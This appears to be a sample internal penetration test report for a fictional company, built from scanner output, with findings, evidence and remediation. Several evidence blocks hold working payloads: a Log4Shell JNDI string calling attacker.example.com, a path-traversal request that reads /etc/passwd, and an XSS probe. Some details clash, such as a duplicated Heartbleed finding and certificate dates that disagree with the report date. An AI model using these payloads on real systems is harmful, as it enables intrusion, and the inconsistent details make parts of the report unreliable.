# Example Corp -- Internal Network Pentest

**Date:** 2026-04-19  
**Author:** Your Name  
**Scope:** 192.168.1.0/24 internal segment, 3 hosts, authorized assessment  

---

## Executive Summary

| Severity | Count |
|----------|-------|
| Critical | 6 |
| High | 7 |
| Medium | 14 |
| Low | 11 |
| Info | 6 |

**Total findings: 44**

---

## 🔴 Critical Findings

### Ssl Heartbleed

**Asset:** `web01.example-corp.local:443/tcp`  
**Severity:** Critical  
**CVSS Score:** 9.5  
**Source:** nmap  

#### Evidence

```
Script: ssl-heartbleed
VULNERABLE:
  The Heartbleed Bug is a serious vulnerability in the OpenSSL cryptographic software library.
  State: VULNERABLE
  IDs: CVE:CVE-2014-0160
  Risk factor: High
  Description: OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug.
  References: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
```

#### Remediation

Upgrade OpenSSL to a patched version (≥ 1.0.1g). After patching, revoke and reissue all TLS certificates that may have been exposed, and invalidate all session tokens.

#### References

- https://nvd.nist.gov/vuln/detail/CVE-2014-0160

---

### Smb Vuln Ms17 010

**Asset:** `dc01.example-corp.local:445/tcp`  
**Severity:** Critical  
**CVSS Score:** 9.5  
**Source:** nmap  

#### Evidence

```
Script: smb-vuln-ms17-010
VULNERABLE:
  Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
  State: VULNERABLE
  IDs: CVE:CVE-2017-0144  OSVDB:148427
  Risk factor: HIGH
  Description: A critical remote code execution vulnerability exists in Microsoft SMBv1 in multiple versions of Microsoft Windows and Windows Server. This was exploited in the WannaCry ransomware campaign.
  Disclosure date: 2017-03-14
  References: https://nvd.nist.gov/vuln/detail/CVE-2017-0144
    https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

#### Remediation

This is a critical-severity finding. Apply the vendor-recommended patch or mitigation immediately. Escalate to the system owner and track remediation with a defined deadline (typically 24–72 hours for critical issues).

#### References

- https://nvd.nist.gov/vuln/detail/CVE-2017-0144

---

### Apache Log4j2 Remote Code Execution (Log4Shell)

**Asset:** `http://192.168.1.10:8080`  
**Severity:** Critical  
**CVSS Score:** 10  
**CWE:** CWE-917  
**Source:** nuclei  

#### Evidence

```
Matched at: http://192.168.1.10:8080/api/v1/users

--- Request ---
GET /api/v1/users HTTP/1.1
Host: 192.168.1.10:8080
User-Agent: ${jndi:ldap://attacker.example.com/exploit}
Accept: */*



--- Response (truncated) ---
HTTP/1.1 200 OK
Content-Type: application/json

{"users":[]}

curl: curl -H 'User-Agent: ${jndi:ldap://attacker.example.com/exploit}' http://192.168.1.10:8080/api/v1/users
```

#### Remediation

Update Log4j2 to version 2.17.1 or later. If updating is not immediately possible, set the JVM flag -Dlog4j2.formatMsgNoLookups=true or remove the JndiLookup class from the classpath.

#### References

- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- https://logging.apache.org/log4j/2.x/security.html

---

### Apache HTTP Server 2.4.49 - Path Traversal / RCE

**Asset:** `http://192.168.1.10`  
**Severity:** Critical  
**CVSS Score:** 9.8  
**CWE:** CWE-22  
**Source:** nuclei  

#### Evidence

```
Matched at: http://192.168.1.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd

--- Request ---
GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1
Host: 192.168.1.10



--- Response (truncated) ---
HTTP/1.1 200 OK

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

curl: curl 'http://192.168.1.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'
```

#### Remediation

Upgrade Apache HTTP Server to version 2.4.50 or later.

#### References

- https://nvd.nist.gov/vuln/detail/CVE-2021-41773
- https://httpd.apache.org/security/vulnerabilities_24.html

---

### SSLv2 Enabled

**Asset:** `web01.example-corp.local:443`  
**Severity:** Critical  
**CVSS Score:** 9.5  
**CWE:** CWE-326  
**Source:** testssl  

#### Evidence

```
Finding ID: SSLv2
offered
```

#### Remediation

Upgrade to TLS 1.2 at minimum; prefer TLS 1.3. Remove support for weak key exchange mechanisms (DH < 2048 bits, export-grade). Use an automated scanner such as testssl.sh after reconfiguration to verify the new cipher-suite profile.

---

### OpenSSL Heartbleed (CVE-2014-0160)

**Asset:** `web01.example-corp.local:443`  
**Severity:** Critical  
**CVSS Score:** 9.5  
**CWE:** CWE-119  
**Source:** testssl  

#### Evidence

```
Finding ID: heartbleed
VULNERABLE, server process has not been restarted!
```

#### Remediation

Apply the available vendor patch or upgrade to a non-vulnerable version. Enable OS-level mitigations: ASLR, DEP/NX, and stack canaries. Where the component is not directly patchable, consider placing it behind a reverse proxy with request size limits enforced.

#### References

- https://nvd.nist.gov/vuln/detail/CVE-2014-0160

---

## 🟠 High Findings

### Http Vuln Cve2021 41773

**Asset:** `web01.example-corp.local:80/tcp`  
**Severity:** High  
**CVSS Score:** 7.5  
**Source:** nmap  

#### Evidence

```
Script: http-vuln-cve2021-41773
VULNERABLE:
  Apache HTTP Server 2.4.49 Path Traversal and RCE
  State: VULNERABLE
  IDs: CVE:CVE-2021-41773
  Description: A flaw was found in Apache HTTP Server 2.4.49. Path traversal and remote code execution is possible if mod_cgi is enabled.
  Disclosure date: 2021-10-04
  References: https://nvd.nist.gov/vuln/detail/CVE-2021-41773
```

#### Remediation

Apply the vendor-recommended patch or configuration fix. Track remediation within your vulnerability management workflow with a deadline aligned to your SLA (typically 7–30 days for high-severity findings).

---

### Apache Tomcat Manager Exposed

**Asset:** `http://192.168.1.10:8080`  
**Severity:** High  
**CVSS Score:** 8.8  
**CWE:** CWE-306  
**Source:** nuclei  

#### Evidence

```
Matched at: http://192.168.1.10:8080/manager/html

--- Request ---
GET /manager/html HTTP/1.1
Host: 192.168.1.10:8080



--- Response (truncated) ---
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Tomcat Manager Application"


curl: curl http://192.168.1.10:8080/manager/html
```

#### Remediation

Restrict access to the Tomcat Manager application using IP allowlist or remove it entirely from production instances. Change default credentials if the application must remain exposed.

#### References

- https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html

---

### HTTP/2 Rapid Reset Attack

**Asset:** `https://192.168.1.10`  
**Severity:** High  
**CVSS Score:** 7.5  
**CWE:** CWE-400  
**Source:** nuclei  

#### Evidence

```
Matched at: https://192.168.1.10

--- Request ---
PRI * HTTP/2.0

SM

SETTINGS[0]
RST_STREAM[...x1000]

--- Response (truncated) ---
Server accepted rapid reset streams — vulnerable
```

#### Remediation

Apply vendor patches for your web server. For Apache, upgrade to 2.4.58 or later. Alternatively, disable HTTP/2 support until patching is possible.

#### References

- https://nvd.nist.gov/vuln/detail/CVE-2023-44487
- https://www.cisa.gov/news-events/alerts/2023/10/10/http2-rapid-reset-attack-cve-2023-44487

---

### SSLv3 Enabled (POODLE)

**Asset:** `web01.example-corp.local:443`  
**Severity:** High  
**CVSS Score:** 7.5  
**CWE:** CWE-326  
**Source:** testssl  

#### Evidence

```
Finding ID: SSLv3
offered
```

#### Remediation

Upgrade to TLS 1.2 at minimum; prefer TLS 1.3. Remove support for weak key exchange mechanisms (DH < 2048 bits, export-grade). Use an automated scanner such as testssl.sh after reconfiguration to verify the new cipher-suite profile.

---

### OpenSSL CCS Injection (CVE-2014-0224)

**Asset:** `web01.example-corp.local:443`  
**Severity:** High  
**CVSS Score:** 7.5  
**CWE:** CWE-310  
**Source:** testssl  

#### Evidence

```
Finding ID: CCS
VULNERABLE (NOT ok)
```

#### Remediation

Disable deprecated cryptographic protocols (SSLv2, SSLv3, TLS 1.0, TLS 1.1) and weak cipher suites (RC4, DES, 3DES, NULL, EXPORT). Configure a modern TLS 1.2/1.3-only profile. Refer to Mozilla's recommended TLS configuration for web servers: https://ssl-config.mozilla.org/

#### References

- https://nvd.nist.gov/vuln/detail/CVE-2014-0224

---

### LOGJAM (CVE-2015-4000)

**Asset:** `web01.example-corp.local:443`  
**Severity:** High  
**CVSS Score:** 7.5  
**CWE:** CWE-310  
**Source:** testssl  

#### Evidence

```
Finding ID: LOGJAM-common
VULNERABLE (NOT ok): common prime
```

#### Remediation

Disable deprecated cryptographic protocols (SSLv2, SSLv3, TLS 1.0, TLS 1.1) and weak cipher suites (RC4, DES, 3DES, NULL, EXPORT). Configure a modern TLS 1.2/1.3-only profile. Refer to Mozilla's recommended TLS configuration for web servers: https://ssl-config.mozilla.org/

#### References

- https://nvd.nist.gov/vuln/detail/CVE-2015-4000

---

### Cert Expiry

**Asset:** `web01.example-corp.local:443`  
**Severity:** High  
**CVSS Score:** 7.5  
**Source:** testssl  

#### Evidence

```
Finding ID: cert_expiry
Certificate expires in 256 days (2025-01-01)
```

#### Remediation

Apply the vendor-recommended patch or configuration fix. Track remediation within your vulnerability management workflow with a deadline aligned to your SLA (typically 7–30 days for high-severity findings).

---

## 🟡 Medium Findings

### Ftp Anon

**Asset:** `ftp01.example-corp.local:21/tcp`  
**Severity:** Medium  
**CVSS Score:** 5.0  
**Source:** nmap  

#### Evidence

```
Script: ftp-anon
Anonymous FTP login allowed (FTP code 230)
drwxr-xr-x    2 0        0            4096 Jan 10 09:00 pub
drwxr-xr-x    3 0        0            4096 Jan 10 09:00 uploads
-rw-r--r--    1 0        0              42 Jan 10 09:00 README.txt
```

#### Remediation

Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.

---

### Reflected Cross-Site Scripting (XSS)

**Asset:** `http://192.168.1.10`  
**Severity:** Medium  
**CVSS Score:** 6.1  
**CWE:** CWE-79  
**Source:** nuclei  

#### Evidence

```
Matched at: http://192.168.1.10/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E

--- Request ---
GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: 192.168.1.10



--- Response (truncated) ---
HTTP/1.1 200 OK

<html><body><p>Results for: <script>alert(1)</script></p></body></html>

curl: curl 'http://192.168.1.10/search?q=<script>alert(1)</script>'
```

#### Remediation

Apply context-aware output encoding to all user-supplied values rendered in HTML. Implement a Content-Security-Policy header that restricts inline script execution.

#### References

- https://owasp.org/www-community/attacks/xss/
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

### TLS 1.0 Enabled

**Asset:** `web01.example-corp.local:443`  
**Severity:** Medium  
**CVSS Score:** 5.0  
**CWE:** CWE-326  
**Source:** testssl  

#### Evidence

```
Finding ID: TLS1
offered with final
```

#### Remediation

Upgrade to TLS 1.2 at minimum; prefer TLS 1.3. Remove support for weak key exchange mechanisms (DH < 2048 bits, export-grade). Use an automated scanner such as testssl.sh after reconfiguration to verify the new cipher-suite profile.

---

### SWEET32 Birthday Attack (CVE-2016-2183)

**Asset:** `web01.example-corp.local:443`  
**Severity:** Medium  
**CVSS Score:** 5.0  
**CWE:** CWE-326  
**Source:** testssl  

#### Evidence

```
Finding ID: SWEET32
VULNERABLE, uses 64 bit block ciphers
```

#### Remediation

Upgrade to TLS 1.2 at minimum; prefer TLS 1.3. Remove support for weak key exchange mechanisms (DH < 2048 bits, export-grade). Use an automated scanner such as testssl.sh after reconfiguration to verify the new cipher-suite profile.

#### References

- https://nvd.nist.gov/vuln/detail/CVE-2016-2183

---

### /phpinfo.php: PHP information file detected. This file leaks server configuration, PHP version, loaded extensions, and e

**Asset:** `web01.example-corp.local:80/phpinfo.php`  
**Severity:** Medium  
**CVSS Score:** 5.0  
**Source:** nikto  

#### Evidence

```
URI: /phpinfo.php
/phpinfo.php: PHP information file detected. This file leaks server configuration, PHP version, loaded extensions, and environment variables.
```

#### Remediation

Remove or restrict access to phpinfo() pages. These pages disclose server configuration, installed PHP extensions, environment variables, and file paths that facilitate further attacks.

---

### /.git/HEAD: Git repository HEAD file is exposed. An attacker can reconstruct the full source code using tools such as gi

**Asset:** `web01.example-corp.local:80/.git/HEAD`  
**Severity:** Medium  
**CVSS Score:** 5.0  
**Source:** nikto  

#### Evidence

```
URI: /.git/HEAD
/.git/HEAD: Git repository HEAD file is exposed. An attacker can reconstruct the full source code using tools such as git-dumper.
```

#### Remediation

Block access to the .git directory at the web server level. An exposed .git directory can leak full source code, commit history, and potentially credentials embedded in the codebase.

---

### /backup.zip: Backup archive is publicly accessible. May contain source code, configuration files, or credentials.

**Asset:** `web01.example-corp.local:80/backup.zip`  
**Severity:** Medium  
**CVSS Score:** 5.0  
**Source:** nikto  

#### Evidence

```
URI: /backup.zip
/backup.zip: Backup archive is publicly accessible. May contain source code, configuration files, or credentials.
```

#### Remediation

Remove backup files from the web root. Backup files often contain source code, credentials, or configuration data and should be stored outside the document root with access controls enforced at the OS level.

---

### /server-status: Apache server-status page is publicly accessible. Discloses active requests, client IPs, and server load

**Asset:** `web01.example-corp.local:80/server-status`  
**Severity:** Medium  
**CVSS Score:** 5.0  
**Source:** nikto  

#### Evidence

```
URI: /server-status
/server-status: Apache server-status page is publicly accessible. Discloses active requests, client IPs, and server load.
```

#### Remediation

Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.

---

### Discovered Endpoint: http://192.168.1.10/admin

**Asset:** `http://192.168.1.10/admin`  
**Severity:** Medium  
**CVSS Score:** 5.0  
**Source:** ffuf  

#### Evidence

```
URL:    http://192.168.1.10/admin
Status: 200
Length: 4823
Words:  312
```

#### Remediation

Review whether this endpoint should be publicly accessible. Apply authentication, restrict by IP, or remove if unused.

---

### Discovered Endpoint: http://192.168.1.10/backup

**Asset:** `http://192.168.1.10/backup`  
**Severity:** Medium  
**CVSS Score:** 5.0  
**Source:** ffuf  

#### Evidence

```
URL:    http://192.168.1.10/backup
Status: 200
Length: 1048576
Words:  0
```

#### Remediation

Review whether this endpoint should be publicly accessible. Apply authentication, restrict by IP, or remove if unused.

---

### Discovered Endpoint: http://192.168.1.10/api/v1/users

**Asset:** `http://192.168.1.10/api/v1/users`  
**Severity:** Medium  
**CVSS Score:** 5.0  
**Source:** ffuf  

#### Evidence

```
URL:    http://192.168.1.10/api/v1/users
Status: 200
Length: 893
Words:  45
```

#### Remediation

Review whether this endpoint should be publicly accessible. Apply authentication, restrict by IP, or remove if unused.

---

### Discovered Endpoint: http://192.168.1.10/api/v1/admin/config

**Asset:** `http://192.168.1.10/api/v1/admin/config`  
**Severity:** Medium  
**CVSS Score:** 5.0  
**Source:** ffuf  

#### Evidence

```
URL:    http://192.168.1.10/api/v1/admin/config
Status: 200
Length: 2341
Words:  88
```

#### Remediation

Review whether this endpoint should be publicly accessible. Apply authentication, restrict by IP, or remove if unused.

---

### Discovered Endpoint: http://192.168.1.10/.git

**Asset:** `http://192.168.1.10/.git`  
**Severity:** Medium  
**CVSS Score:** 5.0  
**Source:** ffuf  

#### Evidence

```
URL:    http://192.168.1.10/.git
Status: 200
Length: 23
Words:  2
```

#### Remediation

Review whether this endpoint should be publicly accessible. Apply authentication, restrict by IP, or remove if unused.

---

### Discovered Endpoint: http://192.168.1.10/phpmyadmin

**Asset:** `http://192.168.1.10/phpmyadmin`  
**Severity:** Medium  
**CVSS Score:** 5.0  
**Source:** ffuf  

#### Evidence

```
URL:    http://192.168.1.10/phpmyadmin
Status: 200
Length: 8912
Words:  432
```

#### Remediation

Review whether this endpoint should be publicly accessible. Apply authentication, restrict by IP, or remove if unused.

---

## 🔵 Low Findings

### Http Methods

**Asset:** `web01.example-corp.local:80/tcp`  
**Severity:** Low  
**CVSS Score:** 2.0  
**Source:** nmap  

#### Evidence

```
Script: http-methods
Supported Methods: GET POST OPTIONS HEAD
```

#### Remediation

Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.

---

### TLS 1.1 Enabled

**Asset:** `web01.example-corp.local:443`  
**Severity:** Low  
**CVSS Score:** 2.0  
**CWE:** CWE-326  
**Source:** testssl  

#### Evidence

```
Finding ID: TLS1_1
offered with final
```

#### Remediation

Upgrade to TLS 1.2 at minimum; prefer TLS 1.3. Remove support for weak key exchange mechanisms (DH < 2048 bits, export-grade). Use an automated scanner such as testssl.sh after reconfiguration to verify the new cipher-suite profile.

---

### Cert Chain Of Trust

**Asset:** `web01.example-corp.local:443`  
**Severity:** Low  
**CVSS Score:** 2.0  
**Source:** testssl  

#### Evidence

```
Finding ID: cert_chain_of_trust
self-signed certificate — not trusted by common clients
```

#### Remediation

Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.

---

### Hsts

**Asset:** `web01.example-corp.local:443`  
**Severity:** Low  
**CVSS Score:** 2.0  
**Source:** testssl  

#### Evidence

```
Finding ID: HSTS
not offered
```

#### Remediation

Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.

---

### Cipher Order

**Asset:** `web01.example-corp.local:443`  
**Severity:** Low  
**CVSS Score:** 2.0  
**Source:** testssl  

#### Evidence

```
Finding ID: cipher_order
Server does not enforce cipher order
```

#### Remediation

Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.

---

### Retrieved x-powered-by header: PHP/7.4.3

**Asset:** `web01.example-corp.local:80/`  
**Severity:** Low  
**CVSS Score:** 2.0  
**Source:** nikto  

#### Evidence

```
URI: /
Retrieved x-powered-by header: PHP/7.4.3
```

#### Remediation

Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.

---

### The anti-clickjacking X-Frame-Options header is not present.

**Asset:** `web01.example-corp.local:80/`  
**Severity:** Low  
**CVSS Score:** 2.0  
**Source:** nikto  

#### Evidence

```
URI: /
The anti-clickjacking X-Frame-Options header is not present.
```

#### Remediation

Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.

---

### The X-Content-Type-Options header is not set. This could allow the browser to render the content differently.

**Asset:** `web01.example-corp.local:80/`  
**Severity:** Low  
**CVSS Score:** 2.0  
**Source:** nikto  

#### Evidence

```
URI: /
The X-Content-Type-Options header is not set. This could allow the browser to render the content differently.
```

#### Remediation

Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.

---

### OSVDB-877: HTTP TRACE method is active, which could allow XST (Cross-Site Tracing) attacks.

**Asset:** `web01.example-corp.local:80/`  
**Severity:** Low  
**CVSS Score:** 2.0  
**Source:** nikto  

#### Evidence

```
URI: /
OSVDB-877: HTTP TRACE method is active, which could allow XST (Cross-Site Tracing) attacks.
```

#### Remediation

Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.

---

### Discovered Endpoint: http://192.168.1.10/uploads

**Asset:** `http://192.168.1.10/uploads`  
**Severity:** Low  
**CVSS Score:** 2.0  
**Source:** ffuf  

#### Evidence

```
URL:    http://192.168.1.10/uploads
Status: 200
Length: 1247
Words:  54
```

#### Remediation

Review whether this endpoint should be publicly accessible. Apply authentication, restrict by IP, or remove if unused.

---

### Discovered Endpoint: http://192.168.1.10/robots.txt

**Asset:** `http://192.168.1.10/robots.txt`  
**Severity:** Low  
**CVSS Score:** 2.0  
**Source:** ffuf  

#### Evidence

```
URL:    http://192.168.1.10/robots.txt
Status: 200
Length: 128
Words:  8
```

#### Remediation

Review whether this endpoint should be publicly accessible. Apply authentication, restrict by IP, or remove if unused.

---

## ⚪ Info Findings

### Ssh Hostkey

**Asset:** `web01.example-corp.local:22/tcp`  
**Severity:** Info  
**CVSS Score:** 0.0  
**Source:** nmap  

#### Evidence

```
Script: ssh-hostkey
2048 SHA256:abc123 (RSA)
256 SHA256:def456 (ECDSA)
```

#### Remediation

Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.

---

### Ssl Cert

**Asset:** `web01.example-corp.local:443/tcp`  
**Severity:** Info  
**CVSS Score:** 0.0  
**Source:** nmap  

#### Evidence

```
Script: ssl-cert
Subject: commonName=web01.example-corp.local
Issuer: commonName=Example-Corp-CA
Public Key type: rsa
Public Key bits: 2048
Not valid before: 2024-01-01
Not valid after: 2025-01-01
```

#### Remediation

Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.

---

### Open Ports Enumeration

**Asset:** `192.168.1.10`  
**Severity:** Info  
**CVSS Score:** 0.0  
**Source:** nmap  

#### Evidence

```
Open ports discovered:
22/tcp  ssh (OpenSSH 7.4)
80/tcp  http (Apache httpd 2.4.49)
443/tcp  https (Apache httpd 2.4.49)
8080/tcp  http (Apache Tomcat 9.0.1)
```

#### Remediation

Review each exposed port. Restrict access to administrative services using host-based firewall rules or network ACLs. Disable or remove services that are not required.

---

### Open Ports Enumeration

**Asset:** `192.168.1.20`  
**Severity:** Info  
**CVSS Score:** 0.0  
**Source:** nmap  

#### Evidence

```
Open ports discovered:
445/tcp  microsoft-ds (Windows Server 2016 )
3389/tcp  ms-wbt-server (Microsoft Terminal Services )
135/tcp  msrpc (Microsoft Windows RPC )
139/tcp  netbios-ssn (Microsoft Windows netbios-ssn )
```

#### Remediation

Review each exposed port. Restrict access to administrative services using host-based firewall rules or network ACLs. Disable or remove services that are not required.

---

### Open Ports Enumeration

**Asset:** `192.168.1.30`  
**Severity:** Info  
**CVSS Score:** 0.0  
**Source:** nmap  

#### Evidence

```
Open ports discovered:
21/tcp  ftp (vsftpd 3.0.3)
22/tcp  ssh (OpenSSH 8.2p1)
3306/tcp  mysql (MySQL 5.7.39)
```

#### Remediation

Review each exposed port. Restrict access to administrative services using host-based firewall rules or network ACLs. Disable or remove services that are not required.

---

### Technology Disclosure via X-Powered-By Header

**Asset:** `http://192.168.1.10`  
**Severity:** Info  
**CVSS Score:** 0.0  
**CWE:** CWE-200  
**Source:** nuclei  

#### Evidence

```
Matched at: http://192.168.1.10/

--- Response (truncated) ---
HTTP/1.1 200 OK
X-Powered-By: PHP/7.4.3

```

#### Remediation

Remove or suppress the X-Powered-By header in your web server or application framework configuration.

---
